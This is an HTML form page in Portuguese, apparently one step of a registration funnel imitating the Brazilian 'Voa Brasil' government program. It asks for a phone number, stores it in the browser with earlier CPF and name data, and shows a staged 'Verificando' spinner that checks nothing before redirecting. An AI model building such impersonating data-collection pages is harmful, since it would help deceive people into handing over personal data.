<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>Voa Brasil - Telefone</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Rawline", -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
      }

      body {
        background-color: #f8f9fa;
        min-height: 100vh;
        max-width: 100%;
        overflow-x: hidden;
        position: relative;
      }

      .header-image {
        width: 100%;
        background: white;
      }

      .header-image img {
        width: 100%;
        height: auto;
        display: block;
      }

      .container {
        width: 100%;
        max-width: 460px;
        margin: 16px auto;
        background: white;
        padding: 16px;
      }

      .top-bar {
        background: white;
        padding: 8px 12px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 1px solid #ddd;
        width: 100%;
      }

      .logo {
        height: 24px;
      }

      .top-icons {
        display: flex;
        align-items: center;
        gap: 12px;
      }

      .top-icons img {
        height: 20px;
      }

      .user-button {
        background: #1351b4;
        color: white;
        padding: 4px 12px;
        border-radius: 20px;
        text-decoration: none;
        font-size: 12px;
      }

      .sub-header {
        background: white;
        padding: 8px 12px;
        display: flex;
        align-items: center;
        gap: 12px;
        border-bottom: 1px solid #ddd;
        width: 100%;
      }

      .menu-icon {
        font-size: 20px;
      }

      .sub-header h1 {
        font-size: 14px;
        font-weight: 500;
      }

      .title {
        font-size: 18px;
        color: #1b1b1b;
        text-align: center;
        margin-bottom: 24px;
      }

      .question {
        margin-bottom: 16px;
      }

      .question-number {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 20px;
        height: 20px;
        background: #1351b4;
        color: white;
        border-radius: 50%;
        margin-right: 8px;
        font-size: 12px;
      }

      .question-text {
        font-size: 14px;
        color: #1b1b1b;
      }

      .options {
        display: flex;
        flex-direction: column;
        gap: 8px;
      }

      .option {
        padding: 16px;
        background: #f8f9fa;
        border-radius: 4px;
        cursor: pointer;
        font-size: 14px;
        border: 2px solid transparent;
        transition: all 0.2s ease;
      }

      .option:hover {
        background: #e9ecef;
      }

      .option.selected {
        background: #e5f0ff;
        border-color: #1351b4;
        color: #1351b4;
      }

      .confirm-button {
        width: 100%;
        padding: 12px;
        background: #1351b4;
        color: white;
        border: none;
        border-radius: 20px;
        font-size: 14px;
        cursor: pointer;
        margin-top: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }

      .confirm-button:hover {
        background: #0d47a1;
      }

      .confirm-button:disabled {
        background-color: #cccccc;
        cursor: not-allowed;
      }

      .spinner {
        width: 20px;
        height: 20px;
        border: 2px solid white;
        border-top: 2px solid transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        display: none;
      }

      .checkmark {
        width: 20px;
        height: 20px;
        display: none;
      }

      .checkmark::before {
        content: "✓";
        color: white;
        font-size: 16px;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }

        100% {
          transform: rotate(360deg);
        }
      }

      .social-links {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin: 30px 0;
      }

      .social-links a {
        color: #1351b4;
        text-decoration: none;
      }

      .footer-image {
        width: 100%;
        margin-top: 40px;
      }

      .footer-image img {
        width: 100%;
        height: auto;
        display: block;
      }

      .header-content {
        position: absolute;
        top: 10px;
        right: 30px;
        display: flex;
        align-items: center;
        gap: 12px;
        z-index: 10;
      }

      .header-button {
        background: transparent;
        color: white;
        padding: 6px 16px 6px 36px;
        border-radius: 20px;
        text-decoration: none;
        font-size: 15px;
        font-weight: 500;
        position: relative;
      }

      .header-button::before {
        content: "";
        position: absolute;
        left: 12px;
        top: 50%;
        transform: translateY(-50%);
        width: 16px;
        height: 16px;
        background-image: url("imagens/user-icon.png");
        background-size: contain;
        background-repeat: no-repeat;
      }

      .header-button:hover {
        background: transparent;
        opacity: 0.9;
      }

      input[type="tel"] {
        width: 100%;
        padding: 16px;
        border: 2px solid #1351b4;
        border-radius: 8px;
        font-size: 16px;
        color: #666;
        margin-bottom: 8px;
        background-color: #ffffd4;
        outline: none;
      }

      input[type="tel"]::placeholder {
        color: #999;
        font-style: italic;
      }

      .error-msg {
        color: #e74c3c;
        font-size: 14px;
        margin-bottom: 16px;
        display: none;
      }

      @media (max-width: 480px) {
        .container {
          margin: 12px auto;
          padding: 12px;
        }

        .title {
          font-size: 16px;
          margin-bottom: 20px;
        }

        .option {
          padding: 10px;
        }
      }
    </style>
  </head>

  <body>
    <div class="header-image">
      <img src="images/head-pag3-2.0.jpg" alt="Header" />
      <div class="header-content">
        <a href="#" class="header-button" id="user-name-button">CLIENTE</a>
      </div>
    </div>

    <div class="container">
      <h2 class="title">
        Confirme seus dados para o cadastro<br />no Programa Voa Brasil
      </h2>

      <div class="question">
        <span class="question-number">3</span>
        <span class="question-text">Qual é o seu telefone?</span>
      </div>

      <form id="telefoneForm">
        <input
          type="tel"
          id="telefone"
          placeholder="(11) 99999-9999"
          maxlength="15"
        />
        <div class="error-msg" id="erro-telefone">Telefone inválido</div>

        <button type="submit" class="confirm-button" id="confirm-button">
          <span class="button-text">Confirmar</span>
          <span class="spinner"></span>
          <span class="checkmark"></span>
        </button>
      </form>
    </div>

    <div class="footer-image">
      <img src="images/rodape3.jpg" alt="Rodapé" />
    </div>

    <script>
      function log(message, data = null) {
        if (data) {
          console.log(`[VOA BRASIL] ${message}:`, data);
        } else {
          console.log(`[VOA BRASIL] ${message}`);
        }
      }

      document.addEventListener("DOMContentLoaded", function () {
        const inputTelefone = document.getElementById("telefone");
        const form = document.getElementById("telefoneForm");
        const confirmButton = document.getElementById("confirm-button");
        const buttonText = document.querySelector(".button-text");
        const spinner = document.querySelector(".spinner");
        const checkmark = document.querySelector(".checkmark");
        const erroTelefone = document.getElementById("erro-telefone");
        const userNameButton = document.getElementById("user-name-button");

        // Atualizar o nome do usuário no botão do header
        try {
          const dadosUsuario =
            JSON.parse(localStorage.getItem("dadosCPF")) || {};
          if (dadosUsuario.NOME) {
            userNameButton.textContent = dadosUsuario.NOME.split(" ")[0];
          }
        } catch (error) {
          log("Erro ao recuperar nome do usuário do localStorage", error);
        }
        /**
         *
         * @param {string} valor - Número de telefone
         * @return {string} Número de telefone formatado
         */
        function aplicarMascaraTelefone(valor) {
          valor = valor.replace(/\D/g, "");

          if (valor.length > 11) {
            valor = valor.substring(0, 11);
          }

          if (valor.length > 2) {
            valor = "(" + valor.substring(0, 2) + ") " + valor.substring(2);
          }
          if (valor.length > 10) {
            valor = valor.substring(0, 10) + "-" + valor.substring(10);
          }

          return valor;
        }

        /**
         *
         * @param {string} valor - Número de telefone
         * @return {boolean} Resultado da validação
         */
        function validarTelefone(valor) {
          if (!valor) {
            return false;
          }

          // Remove todos os caracteres não numéricos para contar os dígitos
          const numeros = valor.replace(/\D/g, "");

          // Verifica se tem a quantidade correta de dígitos (DDD + 9 dígitos = 11)
          if (numeros.length !== 11) {
            return false;
          }

          return true;
        }

        /**
         *
         * @param {string} telefone - Número de telefone
         * @return {boolean} Resultado do salvamento
         */
        function salvarTelefoneNoLocalStorage(telefone) {
          log("Salvando telefone no localStorage:", telefone);

          try {
            // Obter dados existentes do usuário
            const dadosUsuario =
              JSON.parse(localStorage.getItem("dadosCPF")) || {};

            // Adicionar o telefone aos dados
            dadosUsuario.TELEFONE = telefone;

            // Salvar de volta no localStorage
            localStorage.setItem("dadosCPF", JSON.stringify(dadosUsuario));

            log("Telefone salvo com sucesso no localStorage", dadosUsuario);
            return true;
          } catch (error) {
            log("Erro ao salvar telefone no localStorage", error);
            return false;
          }
        }

        try {
          const dadosUsuario =
            JSON.parse(localStorage.getItem("dadosCPF")) || {};
          if (dadosUsuario.TELEFONE) {
            inputTelefone.value = dadosUsuario.TELEFONE;
          }
        } catch (error) {
          log("Erro ao recuperar dados do localStorage", error);
        }

        inputTelefone.addEventListener("input", () => {
          inputTelefone.value = aplicarMascaraTelefone(inputTelefone.value);
          erroTelefone.style.display = "none";
        });

        form.addEventListener("submit", function (e) {
          e.preventDefault();

          const telefone = inputTelefone.value.trim();

          if (!telefone) {
            erroTelefone.textContent = "Por favor, digite seu telefone";
            erroTelefone.style.display = "block";
            return;
          }

          if (!validarTelefone(telefone)) {
            erroTelefone.textContent =
              "Digite um telefone válido no formato (XX) XXXXX-XXXX";
            erroTelefone.style.display = "block";
            return;
          }

          erroTelefone.style.display = "none";

          confirmButton.disabled = true;
          buttonText.textContent = "Verificando";
          spinner.style.display = "inline-block";
          checkmark.style.display = "none";

          setTimeout(() => {
            const salvou = salvarTelefoneNoLocalStorage(telefone);

            if (!salvou) {
              confirmButton.disabled = false;
              buttonText.textContent = "Confirmar";
              spinner.style.display = "none";
              erroTelefone.textContent =
                "Erro ao salvar telefone. Tente novamente.";
              erroTelefone.style.display = "block";
              return;
            }

            spinner.style.display = "none";
            checkmark.style.display = "inline-block";
            buttonText.textContent = "Verificado";

            setTimeout(() => {
              window.location.href = "../7/index.html" + window.location.search;
            }, 500);
          }, 1500);
        });
      });
    </script>
  </body>
</html>
